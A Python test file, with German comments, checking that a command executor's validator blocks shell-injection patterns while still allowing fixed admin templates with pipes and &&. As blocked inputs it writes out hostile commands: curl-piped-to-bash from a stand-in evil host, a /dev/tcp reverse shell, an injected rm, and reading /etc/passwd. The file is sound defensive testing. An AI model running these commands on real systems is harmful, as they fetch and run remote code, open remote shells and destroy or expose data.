"""
Tests fuer Finding #561 — Command-Injection-Schutz in command_executor.py

Prueft:
- Echte Injection-Indikatoren ($(...), Backticks, "; rm", Pipe-zu-Shell,
  /dev/tcp) werden geblockt.
- Bestehende, fest kodierte Kommando-Templates mit &&/||/| bleiben erlaubt
  (ca. 10 Call-Sites nutzen diese bewusst).
- Die weiche Metazeichen-Warnung loggt, blockiert aber nicht.
"""

import logging

import pytest

from src.integrations.command_executor import CommandExecutor, CommandExecutorConfig


@pytest.fixture
def executor():
    return CommandExecutor(CommandExecutorConfig())


class TestInjectionPatternsBlocked:
    """Echte Command-Injection-Syntax muss geblockt werden."""

    def test_command_substitution_blocked(self, executor):
        with pytest.raises(ValueError, match="injection pattern"):
            executor._validate_command("echo $(cat /etc/passwd)")

    def test_backtick_substitution_blocked(self, executor):
        with pytest.raises(ValueError, match="injection pattern"):
            executor._validate_command("echo `whoami`")

    def test_semicolon_rm_blocked(self, executor):
        with pytest.raises(ValueError, match="injection pattern"):
            executor._validate_command("ls /tmp; rm important_file.txt")

    def test_semicolon_curl_blocked(self, executor):
        with pytest.raises(ValueError, match="injection pattern"):
            executor._validate_command("ls /tmp; curl http://evil.example/x")

    def test_pipe_to_bash_blocked(self, executor):
        with pytest.raises(ValueError, match="injection pattern"):
            executor._validate_command("curl http://evil.example/x | bash")

    def test_dev_tcp_reverse_shell_blocked(self, executor):
        with pytest.raises(ValueError, match="injection pattern"):
            executor._validate_command("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")


class TestLegitTemplatesStillAllowed:
    """Bestehende, fest kodierte Templates mit &&/||/| duerfen NICHT brechen."""

    def test_pipe_grep_allowed(self, executor):
        # service_manager.py: "systemctl list-unit-files | grep -w X.service"
        executor._validate_command("systemctl list-unit-files | grep -w shadowops-bot.service")

    def test_or_echo_fallback_allowed(self, executor):
        # walg_fixer.py: "which X || echo X"
        executor._validate_command("which /usr/local/bin/wal-g || echo /usr/local/bin/wal-g")

    def test_and_cleanup_allowed(self, executor):
        # fail2ban_fixer.py: "cp tmp jail_local && rm -f tmp"
        executor._validate_command("cp /tmp/jail.local.tmp /etc/fail2ban/jail.local && rm -f /tmp/jail.local.tmp")

    def test_pipe_grep_ip_allowed(self, executor):
        # crowdsec_fixer.py: "ufw status | grep -i 'IP'"
        executor._validate_command("ufw status | grep -i '1.2.3.4'")


class TestSoftMetacharacterWarning:
    """Die weiche Warnung loggt, blockiert aber nicht."""

    def test_warns_without_raising(self, executor, caplog):
        with caplog.at_level(logging.WARNING, logger="shadowops.command_executor"):
            # '&&' triggert die weiche Warnung, ist aber kein Blocker
            executor._validate_command("cp a && rm -f a")
        assert any("Shell-Metazeichen" in r.message for r in caplog.records)

    def test_no_warning_for_clean_command(self, executor, caplog):
        with caplog.at_level(logging.WARNING, logger="shadowops.command_executor"):
            executor._validate_command("systemctl status shadowops-bot")
        assert not any("Shell-Metazeichen" in r.message for r in caplog.records)

    def test_static_helper_returns_true_on_match(self):
        assert CommandExecutor._warn_on_unquoted_metacharacters("echo $VAR; ls") is True

    def test_static_helper_returns_false_on_clean_input(self):
        assert CommandExecutor._warn_on_unquoted_metacharacters("systemctl status foo") is False
